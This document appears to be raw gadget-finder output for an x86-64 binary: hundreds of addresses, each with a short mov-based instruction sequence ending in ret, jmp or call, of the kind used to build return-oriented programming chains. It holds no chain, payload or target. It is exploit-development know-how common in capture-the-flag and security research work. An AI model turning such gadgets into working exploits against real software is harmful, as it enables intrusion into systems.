0x000000000045cac6 : mov edi, dword ptr [rsp + 0x40] ; call rbx
0x0000000000459d37 : mov edi, dword ptr [rsp + 0x40] ; mov rax, qword ptr [rsp + 0x20] ; call rax
0x0000000000407aae : mov edi, dword ptr [rsp + 0xc] ; mov rax, qword ptr [rsp + 0x18] ; call rax
0x000000000041d7eb : mov edi, dword ptr [rsp + 8] ; add rsp, 0x20 ; pop rbx ; jmp rax
0x00000000004512c1 : mov edi, dword ptr [rsp + 8] ; mov rax, qword ptr [rsp + 0x10] ; call rax
0x000000000041d0f6 : mov edi, dword ptr [rsp] ; add rsp, 0x10 ; pop rbx ; jmp rax
0x00000000004948fc : mov edi, dword ptr [rsp] ; mov rdx, qword ptr [rbp] ; call r12
0x000000000040a9d5 : mov edi, eax ; call 0x414339
0x0000000000429fe4 : mov edi, eax ; call rcx
0x000000000046f5d0 : mov edi, ebp ; call 0x4004b9
0x0000000000428503 : mov edi, ebp ; call 0x424744
0x000000000049066e : mov edi, ebp ; call qword ptr [r14]
0x000000000040824e : mov edi, ebp ; call qword ptr [r15 + rbx*8]
0x0000000000490742 : mov edi, ebp ; call qword ptr [rax]
0x000000000049081e : mov edi, ebp ; call qword ptr [rcx]
0x000000000045edfc : mov edi, ebp ; call r12
0x00000000004957ec : mov edi, ebp ; call r14
0x0000000000429366 : mov edi, ebp ; call rax
0x000000000047ad41 : mov edi, ebp ; call rbx
0x000000000047ae92 : mov edi, ebp ; mov r9, r14 ; call rbx
0x0000000000414919 : mov edi, ebp ; mov rax, qword ptr [rsp + 8] ; call rax
0x0000000000464172 : mov edi, ebx ; call 0x400444
0x00000000004556be : mov edi, ebx ; call r14
0x0000000000419dd6 : mov edi, ebx ; call rax
0x000000000041d18d : mov edi, ebx ; pop rbx ; pop rbp ; jmp rax
0x00000000004779ef : mov edi, ebx ; pop rbx ; pop rbp ; pop r12 ; jmp rax
0x000000000049b2b1 : mov edi, ecx ; inc dword ptr [rcx - 0x74] ; stc ; call rcx
0x000000000049b2ed : mov edi, ecx ; jmp qword ptr [rsi + 0x26fff98b]
0x000000000049b2f1 : mov edi, ecx ; jmp qword ptr [rsi]
0x0000000000478e68 : mov edi, edi ; call r12
0x0000000000417d03 : mov edi, edi ; call rax
0x0000000000455cab : mov edi, edi ; mov rsi, qword ptr [rbp - 0x70] ; call rsi
0x000000000048b3a1 : mov edi, edx ; mov byte ptr [rsi], al ; jne 0x48b389 ; mov rax, rsi ; ret
0x000000000045ef53 : mov edi, esi ; call rbx
0x000000000045f231 : mov edi, esi ; call rdx
0x0000000000423a81 : mov edi, esi ; mov dword ptr [rsp + 8], r10d ; call 0x41fd29
0x000000000040a938 : mov edi, esp ; call 0x426b84
0x0000000000494804 : mov edi, esp ; call r15
0x0000000000478b90 : mov edi, esp ; call rbx
0x000000000044ebc6 : mov edx, 0 ; cmove rax, rdx ; pop rbx ; ret
0x0000000000419576 : mov edx, 0x130 ; pop rbx ; ret
0x0000000000473362 : mov edx, 0x480024be ; mov eax, dword ptr [rax + rdi*8] ; jmp rax
0x0000000000452716 : mov edx, 0x64 ; test eax, eax ; cmove eax, edx ; ret
0x00000000004573e2 : mov edx, 0x85fffa90 ; ror byte ptr [rdi], 0x84 ; ret 0xfffc
0x0000000000453fd2 : mov edx, 0x89000281 ; ret
0x00000000004ae33e : mov edx, 0xcac982a4 ; call 0xffffffffaf0d81be
0x00000000004577a7 : mov edx, 0xffffffff ; cmovs eax, edx ; ret
0x000000000048526c : mov edx, 1 ; mov eax, edx ; pop rbx ; pop rbp ; ret
0x000000000045f22a : mov edx, dword ptr [rbp - 0x98] ; mov rdi, r14 ; call rdx
0x0000000000494900 : mov edx, dword ptr [rbp] ; call r12
0x000000000048ba29 : mov edx, dword ptr [rbx + 0x18] ; mov qword ptr [rdx], rax ; pop rbx ; ret
0x00000000004454ef : mov edx, dword ptr [rcx + rdx*4] ; mov eax, dword ptr [rcx + rax*4] ; sub eax, edx ; ret
0x0000000000443c1d : mov edx, dword ptr [rcx + rdx*4] ; sub eax, edx ; ret
0x000000000048ba3d : mov edx, dword ptr [rdi + 0x30] ; mov qword ptr [rax], rdx ; pop rbx ; ret
0x00000000004957e9 : mov edx, dword ptr [rdi] ; mov rdi, r13 ; call r14
0x000000000044ac82 : mov edx, dword ptr [rsi + 3] ; mov dword ptr [rdi], ecx ; mov dword ptr [rdi + 3], edx ; ret
0x000000000044ac73 : mov edx, dword ptr [rsi + 4] ; mov dword ptr [rdi], ecx ; mov word ptr [rdi + 4], dx ; ret
0x000000000044acc3 : mov edx, dword ptr [rsi + 7] ; mov qword ptr [rdi], rcx ; mov dword ptr [rdi + 7], edx ; ret
0x000000000044acd3 : mov edx, dword ptr [rsi + 8] ; mov qword ptr [rdi], rcx ; mov dword ptr [rdi + 8], edx ; ret
0x0000000000436181 : mov edx, dword ptr [rsi - 2] ; mov word ptr [rdi - 2], dx ; ret
0x0000000000436540 : mov edx, dword ptr [rsi - 4] ; mov dword ptr [rdi - 4], edx ; ret
0x0000000000435dd1 : mov edx, dword ptr [rsi - 8] ; mov qword ptr [rdi - 8], rdx ; ret
0x000000000044b270 : mov edx, dword ptr [rsi] ; mov dword ptr [rdi], edx ; lea rax, qword ptr [rdi + 3] ; ret
0x000000000043c220 : mov edx, dword ptr [rsi] ; mov dword ptr [rdi], edx ; ret
0x000000000044b2c1 : mov edx, dword ptr [rsi] ; mov qword ptr [rdi], rdx ; lea rax, qword ptr [rdi + 7] ; ret
0x000000000043c061 : mov edx, dword ptr [rsi] ; mov qword ptr [rdi], rdx ; ret
0x000000000044b251 : mov edx, dword ptr [rsi] ; mov word ptr [rdi], dx ; lea rax, qword ptr [rdi + 1] ; ret
0x000000000044ac31 : mov edx, dword ptr [rsi] ; mov word ptr [rdi], dx ; ret
0x00000000004891b9 : mov edx, dword ptr [rsp + 0x10] ; call rdx
0x0000000000493a39 : mov edx, dword ptr [rsp] ; mov edi, 1 ; call rax
0x0000000000429fe9 : mov edx, eax ; jmp 0x429f9c
0x000000000045d01a : mov edx, eax ; jmp 0x45cfd1
0x000000000045d151 : mov edx, eax ; jmp 0x45d110
0x000000000045d41f : mov edx, eax ; jmp 0x45d3d6
0x000000000045d496 : mov edx, eax ; jmp 0x45d44d
0x0000000000475ff2 : mov edx, eax ; jmp 0x475fc0
0x000000000047ca7e : mov edx, eax ; jmp 0x47ca72
0x0000000000490669 : mov edx, ebp ; mov rsi, r12 ; mov edi, ebp ; call qword ptr [r14]
0x000000000049073d : mov edx, ebp ; mov rsi, r12 ; mov edi, ebp ; call qword ptr [rax]
0x0000000000490819 : mov edx, ebp ; mov rsi, r12 ; mov edi, ebp ; call qword ptr [rcx]
0x0000000000490623 : mov edx, ebp ; mov rsi, r12 ; mov edi, ebp ; call rax
0x000000000044e6e8 : mov edx, edi ; rep stosb byte ptr [rdi], al ; mov rax, rdx ; ret
0x000000000045c8c9 : mov es, edx ; add eax, 0x29480000 ; ret 0x349
0x0000000000459e12 : mov es, word ptr [rax + rax] ; add bh, dh ; ret 0
0x000000000047c659 : mov es, word ptr [rbx] ; add al, 0x11 ; ret
0x00000000004576dc : mov esi, 0x48891b52 ; push rax ; mov dword ptr [rax + 0x54], edx ; ret
0x0000000000456832 : mov esi, 0x83480147 ; ret
0x0000000000468c41 : mov esi, 0x8900000b ; ret 0x349
0x0000000000472545 : mov esi, 0x8900002b ; ret 0x349
0x000000000047331e : mov esi, 0x8b480024 ; add al, 0xf8 ; jmp rax
0x0000000000424244 : mov esi, 0xb7e ; call 0x400508
0x00000000004ad45e : mov esi, 0xc2c1c0bf ; ret
0x000000000044eb54 : mov esi, 0xf000000 ; lahf ; ret 0xea81
0x0000000000467ac4 : mov esi, 1 ; jmp rax
0x0000000000475b5c : mov esi, 1 ; mov rdi, rbx ; call rax
0x0000000000451158 : mov esi, 2 ; jmp rax
0x000000000045116b : mov esi, 3 ; pop rbp ; pop r12 ; jmp rax
0x000000000045fcc4 : mov esi, dword ptr [rax + rsi*8] ; test rsi, rsi ; je 0x45fcd6 ; call rsi
0x000000000049412d : mov esi, dword ptr [rbp - 0x10] ; mov r15, qword ptr [rbp - 8] ; leave ; ret
0x0000000000455cae : mov esi, dword ptr [rbp - 0x70] ; call rsi
0x0000000000495a0b : mov esi, dword ptr [rdi] ; mov rdi, qword ptr [rsp + 0x10] ; call r14
0x00000000004948b5 : mov esi, dword ptr [rsi] ; call r12
0x000000000044da53 : mov esi, dword ptr [rsi] ; mov dword ptr [rdi + rdx - 4], ecx ; mov dword ptr [rdi], esi ; ret
0x00000000004553b6 : mov esi, dword ptr [rsp + 0x18] ; mov r9, r13 ; call rbx
0x0000000000429361 : mov esi, dword ptr [rsp + 0x28] ; mov rdi, rbp ; call rax
0x00000000004585b4 : mov esi, dword ptr [rsp + 0x38] ; mov rdi, qword ptr [rsp + 0x30] ; call rbx
0x00000000004580e4 : mov esi, dword ptr [rsp + 0x40] ; mov rdi, qword ptr [rsp + 0x38] ; call rbx
0x000000000045cac1 : mov esi, dword ptr [rsp + 0x48] ; mov rdi, qword ptr [rsp + 0x40] ; call rbx
0x0000000000426d79 : mov esi, dword ptr [rsp + 0x68] ; call rax
0x0000000000429fe1 : mov esi, ebp ; mov rdi, rax ; call rcx
0x0000000000428992 : mov esi, ebp ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; jmp rax
0x0000000000428500 : mov esi, ebx ; mov rdi, r13 ; call 0x424747
0x0000000000487968 : mov esi, edi ; dec dword ptr [rax - 0x77] ; ret
0x00000000004947aa : mov esi, edi ; mov edi, 1 ; jmp rax
0x00000000004648d8 : mov esi, edi ; mov rdi, qword ptr [rbp - 0x8a8] ; call rax
0x00000000004852d3 : mov esi, edx ; cmp rcx, rsi ; jne 0x4852b8 ; ret
0x000000000046bcc1 : mov esi, esi ; mov rdi, qword ptr [rbp - 0xc0] ; call rax
0x0000000000494801 : mov esi, esi ; mov rdi, r12 ; call r15
0x000000000049066c : mov esi, esp ; mov edi, ebp ; call qword ptr [r14]
0x0000000000490740 : mov esi, esp ; mov edi, ebp ; call qword ptr [rax]
0x000000000049081c : mov esi, esp ; mov edi, ebp ; call qword ptr [rcx]
0x0000000000490626 : mov esi, esp ; mov edi, ebp ; call rax
0x00000000004779ec : mov esi, esp ; mov rdi, rbx ; pop rbx ; pop rbp ; pop r12 ; jmp rax
0x0000000000413c5b : mov esp, 0x24448b48 ; sub byte ptr [rax - 0x7d], cl ; ret
0x00000000004071c2 : mov esp, 0x3141bebf ; ret
0x0000000000431e61 : mov esp, 0x448d48c0 ; cmp al, dh ; ret
0x0000000000431e91 : mov esp, 0x448d48c0 ; cmp byte ptr [rax], ah ; ret
0x0000000000431e81 : mov esp, 0x448d48c0 ; cmp byte ptr [rax], dl ; ret
0x00000000004b2994 : mov esp, 0x88fffe20 ; cmp al, 0xfe ; jmp rax
0x0000000000473536 : mov esp, 0x8b480024 ; add al, 0xf8 ; jmp rax
0x000000000041e482 : mov esp, 0x8c48348 ; pop rbx ; pop rbp ; ret
0x00000000004582fd : mov esp, 0x9824 ; add byte ptr [rax + 0xf], cl ; ret
0x000000000049c418 : mov esp, 0x99fffb28 ; sub bl, bh ; jmp rsi
0x000000000045877f : mov esp, 0xa824 ; add byte ptr [rax + 0xf], cl ; ret
0x000000000049b6d5 : mov esp, 0xbd80fff9 ; stc ; call rax
0x00000000004475a3 : mov esp, 0xd00148d2 ; sub rax, rdi ; ret
0x0000000000476964 : mov esp, 0xd824 ; add byte ptr [rax - 0x39], cl ; ret 0x2c20
0x00000000004bc6b8 : mov esp, 0xe400009c ; sub ch, bh ; jmp qword ptr [rdx]
0x0000000000431f4b : mov esp, 0xf80148c0 ; add rax, rcx ; ret
0x0000000000431e71 : mov esp, 0xf80148c0 ; ret
0x0000000000432362 : mov esp, 0xf80148c0 ; vzeroupper ; ret
0x0000000000400826 : mov esp, eax ; call 0x44eb48
0x00000000004006ef : mov esp, eax ; call 0x44f008
0x00000000004892da : mov esp, eax ; mov rbp, r9 ; nop ; jmp rdx
0x00000000004942b7 : mov esp, ecx ; ret
0x0000000000451700 : mov esp, esi ; call r15
0x000000000045958d : mov fs, word ptr [rbx] ; add eax, 0x29480000 ; ret 0x349
0x000000000045db0d : mov gs, esi ; add al, 0 ; add byte ptr [rax + 0x29], cl ; ret 0x349
0x0000000000491a23 : mov qword ptr [r10], r8 ; ret
0x000000000043f010 : mov qword ptr [r9 - 8], rcx ; ret
0x0000000000452ba0 : mov qword ptr [rax + 0x10], rcx ; mov qword ptr [rax + 8], rdx ; ret
0x0000000000477638 : mov qword ptr [rax + 0x10], rdx ; mov qword ptr [rax + 0x40], rcx ; ret
0x0000000000477678 : mov qword ptr [rax + 0x10], rsi ; mov qword ptr [rax + 0x40], rcx ; ret
0x0000000000478677 : mov qword ptr [rax + 0x18], rdx ; mov dword ptr [rbx], ecx ; xor eax, eax ; pop rbx ; ret
0x0000000000452c06 : mov qword ptr [rax + 0x20], rcx ; mov byte ptr [rax + 0x28], 1 ; ret
0x0000000000452c20 : mov qword ptr [rax + 0x20], rsi ; ret
0x000000000047763c : mov qword ptr [rax + 0x40], rcx ; ret
0x00000000004786f9 : mov qword ptr [rax + 0x48], 0 ; pop rbx ; ret
0x000000000041df04 : mov qword ptr [rax + 8], 0 ; ret
0x0000000000452ba4 : mov qword ptr [rax + 8], rdx ; ret
0x000000000048ba4c : mov qword ptr [rax], rdi ; pop rbx ; ret
0x000000000048b99c : mov qword ptr [rax], rdx ; add rsp, 8 ; ret
0x000000000048ba40 : mov qword ptr [rax], rdx ; pop rbx ; ret
0x0000000000493dd1 : mov qword ptr [rax], rdx ; ret
0x00000000004789ea : mov qword ptr [rax], rdx ; xor eax, eax ; ret
0x00000000004832c0 : mov qword ptr [rbp - 0x100], r11 ; call r10
0x0000000000474142 : mov qword ptr [rbp - 0x510], rax ; call 0x400439
0x0000000000483c60 : mov qword ptr [rbp - 0xe0], r11 ; call r10
0x000000000045f3b1 : mov qword ptr [rbx + 0x10], 0 ; pop rbx ; ret
0x00000000004194f6 : mov qword ptr [rbx + 0x10], rax ; mov rax, rbx ; pop rbx ; ret
0x000000000048889d : mov qword ptr [rbx + 0x10], rax ; pop rax ; pop rdx ; pop rbx ; ret
0x00000000004198de : mov qword ptr [rbx + 0x10], rax ; xor eax, eax ; pop rbx ; ret
0x00000000004865ad : mov qword ptr [rbx + 0x10], rdx ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000048c752 : mov qword ptr [rbx + 0x18], 0 ; jmp 0x48c728
0x00000000004887d2 : mov qword ptr [rbx + 0x18], rax ; pop rax ; pop rdx ; pop rbx ; ret
0x000000000048efe4 : mov qword ptr [rbx + 0x18], rax ; pop rbx ; ret
0x000000000048f0b8 : mov qword ptr [rbx + 0x20], rax ; pop rbx ; ret
0x000000000041d080 : mov qword ptr [rbx + 0x50], 0 ; pop rbx ; ret
0x000000000041ed1c : mov qword ptr [rbx + 0x60], rbp ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000048c212 : mov qword ptr [rbx], rax ; add rsp, 0x10 ; pop rbx ; ret
0x0000000000491018 : mov qword ptr [rbx], rax ; pop rax ; pop rdx ; pop rbx ; ret
0x0000000000416a60 : mov qword ptr [rcx + 0x130], rdx ; ret
0x0000000000489afe : mov qword ptr [rdi + 0x10], r9 ; ret
0x000000000044b48c : mov qword ptr [rdi + 0x10], rcx ; lea rax, qword ptr [rdi + 0x17] ; ret
0x000000000044adfc : mov qword ptr [rdi + 0x10], rcx ; mov byte ptr [rdi + 0x18], dh ; ret
0x000000000044addc : mov qword ptr [rdi + 0x10], rcx ; ret
0x000000000044ae3f : mov qword ptr [rdi + 0x10], rdx ; mov dword ptr [rdi + 0x17], ecx ; ret
0x000000000044ae5f : mov qword ptr [rdi + 0x10], rdx ; mov dword ptr [rdi + 0x18], ecx ; ret
0x000000000044ae20 : mov qword ptr [rdi + 0x10], rdx ; mov word ptr [rdi + 0x18], cx ; ret
0x000000000041cf62 : mov qword ptr [rdi + 0x18], rax ; mov qword ptr [rdi + 8], rax ; ret
0x0000000000482264 : mov qword ptr [rdi + 0x300], rax ; ret
0x0000000000482236 : mov qword ptr [rdi + 0x308], rax ; ret
0x000000000041cf92 : mov qword ptr [rdi + 0x48], rdx ; mov qword ptr [rdi + 8], rax ; ret
0x0000000000493e10 : mov qword ptr [rdi + 0x98], rsi ; ret
0x000000000044b44c : mov qword ptr [rdi + 0xe], rcx ; lea rax, qword ptr [rdi + 0x15] ; ret
0x000000000044ad9c : mov qword ptr [rdi + 0xe], rcx ; ret
0x000000000044b46c : mov qword ptr [rdi + 0xf], rcx ; lea rax, qword ptr [rdi + 0x16] ; ret
0x000000000044adbc : mov qword ptr [rdi + 0xf], rcx ; ret
0x000000000043bff7 : mov qword ptr [rdi + 1], rdx ; mov qword ptr [rdi], rcx ; ret
0x000000000043bf87 : mov qword ptr [rdi + 2], rdx ; mov qword ptr [rdi], rcx ; ret
0x000000000043bf17 : mov qword ptr [rdi + 3], rdx ; mov qword ptr [rdi], rcx ; ret
0x000000000043bea7 : mov qword ptr [rdi + 4], rdx ; mov qword ptr [rdi], rcx ; ret
0x000000000044b34a : mov qword ptr [rdi + 5], rdx ; lea rax, qword ptr [rdi + 0xc] ; ret
0x000000000043be37 : mov qword ptr [rdi + 5], rdx ; mov qword ptr [rdi], rcx ; ret
0x000000000044acea : mov qword ptr [rdi + 5], rdx ; ret
0x000000000044b36a : mov qword ptr [rdi + 6], rdx ; lea rax, qword ptr [rdi + 0xd] ; ret
0x000000000043bdc7 : mov qword ptr [rdi + 6], rdx ; mov qword ptr [rdi], rcx ; ret
0x000000000044acfa : mov qword ptr [rdi + 6], rdx ; ret
0x000000000044b38a : mov qword ptr [rdi + 7], rdx ; lea rax, qword ptr [rdi + 0xe] ; ret
0x000000000043bd57 : mov qword ptr [rdi + 7], rdx ; mov qword ptr [rdi], rcx ; ret
0x000000000044ad0a : mov qword ptr [rdi + 7], rdx ; ret
0x000000000048af23 : mov qword ptr [rdi + 8], r10 ; mov eax, ecx ; adc eax, eax ; ret
0x0000000000489a83 : mov qword ptr [rdi + 8], r9 ; ret
0x000000000048b26d : mov qword ptr [rdi + 8], rax ; mov eax, 2 ; ret
0x000000000041cf66 : mov qword ptr [rdi + 8], rax ; ret
0x000000000044e7ba : mov qword ptr [rdi + rdx - 8], rcx ; mov qword ptr [rdi], rcx ; ret
0x000000000044da46 : mov qword ptr [rdi + rdx - 8], rcx ; mov qword ptr [rdi], rsi ; ret
0x0000000000493dbb : mov qword ptr [rdi + rsi*8], rdx ; ret
0x0000000000435c64 : mov qword ptr [rdi - 0x10], r11 ; mov qword ptr [rdi - 8], rcx ; ret
0x0000000000435ca2 : mov qword ptr [rdi - 0x10], r11 ; mov qword ptr [rdi - 8], rdx ; ret
0x00000000004899ee : mov qword ptr [rdi - 0x10], r9 ; ret
0x0000000000435feb : mov qword ptr [rdi - 0xa], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x000000000043b807 : mov qword ptr [rdi - 0xa], rdx ; mov dword ptr [rdi - 4], ecx ; ret
0x00000000004361cb : mov qword ptr [rdi - 0xb], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x000000000043b787 : mov qword ptr [rdi - 0xb], rdx ; mov dword ptr [rdi - 4], ecx ; ret
0x00000000004363bb : mov qword ptr [rdi - 0xc], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x000000000043b707 : mov qword ptr [rdi - 0xc], rdx ; mov dword ptr [rdi - 4], ecx ; ret
0x000000000043658c : mov qword ptr [rdi - 0xd], rcx ; mov qword ptr [rdi - 8], rdx ; ret
0x000000000043b678 : mov qword ptr [rdi - 0xd], rdx ; mov qword ptr [rdi - 8], rcx ; ret
0x000000000043678c : mov qword ptr [rdi - 0xe], rcx ; mov qword ptr [rdi - 8], rdx ; ret
0x000000000043b5e8 : mov qword ptr [rdi - 0xe], rdx ; mov qword ptr [rdi - 8], rcx ; ret
0x000000000043698c : mov qword ptr [rdi - 0xf], rcx ; mov qword ptr [rdi - 8], rdx ; ret
0x000000000043b558 : mov qword ptr [rdi - 0xf], rdx ; mov qword ptr [rdi - 8], rcx ; ret
0x0000000000489979 : mov qword ptr [rdi - 8], r9 ; ret
0x0000000000435c68 : mov qword ptr [rdi - 8], rcx ; ret
0x0000000000435ca6 : mov qword ptr [rdi - 8], rdx ; ret
0x0000000000435e1b : mov qword ptr [rdi - 9], r8 ; mov dword ptr [rdi - 4], edx ; ret
0x0000000000435f17 : mov qword ptr [rdi - 9], rcx ; mov byte ptr [rdi - 1], dl ; ret
0x0000000000435e63 : mov qword ptr [rdi - 9], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x000000000043b887 : mov qword ptr [rdi - 9], rdx ; mov dword ptr [rdi - 4], ecx ; ret
0x000000000046f339 : mov qword ptr [rdi], r13 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x0000000000489948 : mov qword ptr [rdi], r9 ; ret
0x000000000044b2d6 : mov qword ptr [rdi], rcx ; lea rax, qword ptr [rdi + 8] ; ret
0x000000000044acc6 : mov qword ptr [rdi], rcx ; mov dword ptr [rdi + 7], edx ; ret
0x000000000044acd6 : mov qword ptr [rdi], rcx ; mov dword ptr [rdi + 8], edx ; ret
0x000000000044ace7 : mov qword ptr [rdi], rcx ; mov qword ptr [rdi + 5], rdx ; ret
0x000000000044acf7 : mov qword ptr [rdi], rcx ; mov qword ptr [rdi + 6], rdx ; ret
0x000000000044ad07 : mov qword ptr [rdi], rcx ; mov qword ptr [rdi + 7], rdx ; ret
0x000000000044acb7 : mov qword ptr [rdi], rcx ; mov word ptr [rdi + 8], dx ; ret
0x000000000043bd5b : mov qword ptr [rdi], rcx ; ret
0x000000000044e93e : mov qword ptr [rdi], rcx ; vzeroupper ; ret
0x000000000044b2c3 : mov qword ptr [rdi], rdx ; lea rax, qword ptr [rdi + 7] ; ret
0x000000000043c063 : mov qword ptr [rdi], rdx ; ret
0x000000000043f00d : mov qword ptr [rdi], rsi ; mov qword ptr [r9 - 8], rcx ; ret
0x000000000044da4b : mov qword ptr [rdi], rsi ; ret
0x0000000000419574 : mov qword ptr [rdx + 0x130], rdi ; pop rbx ; ret
0x0000000000400fe4 : mov qword ptr [rdx + 0x18], rax ; mov eax, 1 ; ret
0x000000000044a86a : mov qword ptr [rdx + 5], rax ; lea rax, qword ptr [rdx + 0xc] ; ret
0x000000000044905a : mov qword ptr [rdx + 5], rax ; mov rax, rdi ; ret
0x000000000044a88a : mov qword ptr [rdx + 6], rax ; lea rax, qword ptr [rdx + 0xd] ; ret
0x000000000044907a : mov qword ptr [rdx + 6], rax ; mov rax, rdi ; ret
0x000000000044a8aa : mov qword ptr [rdx + 7], rax ; lea rax, qword ptr [rdx + 0xe] ; ret
0x000000000044909a : mov qword ptr [rdx + 7], rax ; mov rax, rdi ; ret
0x000000000044a73a : mov qword ptr [rdx + 8], rax ; lea rax, qword ptr [rdx + 0xf] ; ret
0x0000000000402241 : mov qword ptr [rdx + 8], rax ; mov eax, 1 ; ret
0x0000000000448f8a : mov qword ptr [rdx + 8], rax ; mov rax, rdi ; ret
0x000000000041ee8f : mov qword ptr [rdx + 8], rax ; xor eax, eax ; ret
0x000000000044a6e3 : mov qword ptr [rdx], rax ; lea rax, qword ptr [rdx + 7] ; ret
0x0000000000448f33 : mov qword ptr [rdx], rax ; mov rax, rdi ; ret
0x000000000048ba2c : mov qword ptr [rdx], rax ; pop rbx ; ret
0x000000000041edf7 : mov qword ptr [rdx], rax ; ret
0x000000000048b557 : mov qword ptr [rip + 0x238b4a], rax ; ret
0x0000000000485e84 : mov qword ptr [rip + 0x23e8a5], rax ; ret
0x00000000004262a5 : mov qword ptr [rip + 0x29b5b4], rax ; ret
0x00000000004201cb : mov qword ptr [rip + 0x2a168e], rax ; ret
0x000000000041fcc6 : mov qword ptr [rip + 0x2a1b23], rax ; ret
0x000000000041fc9e : mov qword ptr [rip + 0x2a1b43], rax ; ret
0x000000000041fc7e : mov qword ptr [rip + 0x2a1b5b], rax ; ret
0x000000000041fb74 : mov qword ptr [rip + 0x2a1ccd], rax ; ret
0x000000000041fb64 : mov qword ptr [rip + 0x2a1cd5], rax ; ret
0x000000000041fb52 : mov qword ptr [rip + 0x2a1cd7], rdx ; ret
0x000000000041fb14 : mov qword ptr [rip + 0x2a1cdd], rax ; ret
0x000000000041fb04 : mov qword ptr [rip + 0x2a1cf5], rax ; ret
0x000000000047f450 : mov qword ptr [rsi], -1 ; xor eax, eax ; ret
0x0000000000485ff1 : mov qword ptr [rsi], rax ; ret
0x0000000000485338 : mov qword ptr [rsi], rdi ; mov rax, rcx ; ret
0x0000000000463cf9 : mov qword ptr [rsi], rdi ; xor eax, eax ; jmp 0x463cc7
0x0000000000457dcb : mov qword ptr [rsp + 0x50], rax ; call 0x454027
0x000000000042346e : mov qword ptr [rsp + 8], rax ; call rcx
0x0000000000417cfd : mov qword ptr [rsp + 8], rcx ; mov rdi, r15 ; call rax
0x00000000004907c2 : mov qword ptr [rsp], r8 ; mov rsi, r12 ; mov edi, ebp ; call rax
0x0000000000419dd1 : mov qword ptr [rsp], rcx ; mov rdi, rbx ; call rax
0x000000000041d0e4 : mov qword ptr [rsp], rdi ; call 0x419376
0x00000000004617b5 : mov qword ptr fs:[rdx], rax ; ret
0x000000000044da45 : mov qword ptr ss:[rdi + rdx - 8], rcx ; mov qword ptr [rdi], rsi ; ret
0x00000000004ae33d : mov r10d, 0xcac982a4 ; call 0xffffffffaf0d81bf
0x0000000000415cc3 : mov r11d, 1 ; jmp 0x415c94
0x0000000000463c5b : mov r11d, 1 ; jmp 0x463c2c
0x0000000000400825 : mov r12, rax ; call 0x44eb49
0x00000000004006ee : mov r12, rax ; call 0x44f009
0x00000000004516ff : mov r12d, r14d ; call r15
0x00000000004975cb : mov r13b, 0x22 ; add byte ptr [rcx + rcx*4 + 0x2d], cl ; ret 0x22b4
0x000000000049412c : mov r14, qword ptr [rbp - 0x10] ; mov r15, qword ptr [rbp - 8] ; leave ; ret
0x0000000000487967 : mov r14d, r15d ; dec dword ptr [rax - 0x77] ; ret
0x0000000000494130 : mov r15, qword ptr [rbp - 8] ; leave ; ret
0x0000000000491a20 : mov r8, qword ptr [r8] ; mov qword ptr [r10], r8 ; ret
0x0000000000406db3 : mov r8d, dword ptr [rcx + 0x21] ; ret
0x00000000004553ba : mov r9, r13 ; call rbx
0x000000000047ae94 : mov r9, r14 ; call rbx
0x000000000041e390 : mov rax, -1 ; ret
0x000000000047b4b0 : mov rax, 1 ; ret
0x000000000047b4c0 : mov rax, 2 ; ret
0x000000000047b4d0 : mov rax, 3 ; ret
0x000000000047b4e0 : mov rax, 4 ; ret
0x000000000047b4f0 : mov rax, 5 ; ret
0x000000000047b500 : mov rax, 6 ; ret
0x000000000047b510 : mov rax, 7 ; ret
0x000000000048d88e : mov rax, qword ptr [r12] ; add rax, qword ptr [rdx + 8] ; call rax
0x0000000000483805 : mov rax, qword ptr [r15 + 0x10] ; add rax, qword ptr [r14] ; call rax
0x0000000000418290 : mov rax, qword ptr [rax + 0x20] ; jmp rax
0x0000000000478b03 : mov rax, qword ptr [rax + 0x4c] ; ret
0x0000000000488690 : mov rax, qword ptr [rax + 8] ; ret
0x000000000045fdbf : mov rax, qword ptr [rax + rbp*8] ; test rax, rax ; je 0x45fdd3 ; call rax
0x0000000000472936 : mov rax, qword ptr [rax + rcx*8] ; mov ecx, 1 ; jmp rax
0x00000000004617ce : mov rax, qword ptr [rax + rdi*8 + 0x80] ; ret
0x000000000046752c : mov rax, qword ptr [rax + rdi*8] ; jmp rax
0x0000000000493d62 : mov rax, qword ptr [rax] ; ret
0x0000000000483020 : mov rax, qword ptr [rbx + 0x10] ; add rax, qword ptr [r14] ; call rax
0x000000000041d0cc : mov rax, qword ptr [rbx + 0x18] ; add rsp, 0x10 ; pop rbx ; jmp rax
0x000000000048ba48 : mov rax, qword ptr [rbx + 0x18] ; mov qword ptr [rax], rdi ; pop rbx ; ret
0x000000000041d7b8 : mov rax, qword ptr [rbx + 0x40] ; add rsp, 0x20 ; pop rbx ; jmp rax
0x0000000000448f30 : mov rax, qword ptr [rcx] ; mov qword ptr [rdx], rax ; mov rax, rdi ; ret
0x000000000049794c : mov rax, qword ptr [rdi + 0x20] ; test rax, rax ; je 0x497965 ; call rax
0x0000000000478b00 : mov rax, qword ptr [rdi + 0x48] ; mov eax, dword ptr [rax + 0x4c] ; ret
0x000000000041f150 : mov rax, qword ptr [rdi + 0x68] ; ret
0x0000000000493d90 : mov rax, qword ptr [rdi + 0x90] ; ret
0x0000000000493de0 : mov rax, qword ptr [rdi + 0x98] ; ret
0x0000000000493e20 : mov rax, qword ptr [rdi + 0xa0] ; ret
0x0000000000493e80 : mov rax, qword ptr [rdi + 0xa8] ; ret
0x0000000000493e70 : mov rax, qword ptr [rdi + 0xb0] ; ret
0x0000000000493e30 : mov rax, qword ptr [rdi + 0xb8] ; ret
0x0000000000467a76 : mov rax, qword ptr [rdi + rax*8] ; jmp rax
0x000000000048e900 : mov rax, qword ptr [rdi] ; cmp rax, rsi ; je 0x48e919 ; ret
0x000000000041edf4 : mov rax, qword ptr [rdi] ; mov qword ptr [rdx], rax ; ret
0x000000000041ede0 : mov rax, qword ptr [rdx] ; test rax, rax ; jne 0x41ede1 ; ret
0x0000000000485f79 : mov rax, qword ptr [rip + 0x23e7b0] ; ret
0x000000000045e630 : mov rax, qword ptr [rip + 0x265881] ; ret
0x00000000004560d0 : mov rax, qword ptr [rip + 0x26ebd1] ; ret
0x000000000041f130 : mov rax, qword ptr [rip + 0x2a1fe9] ; ret
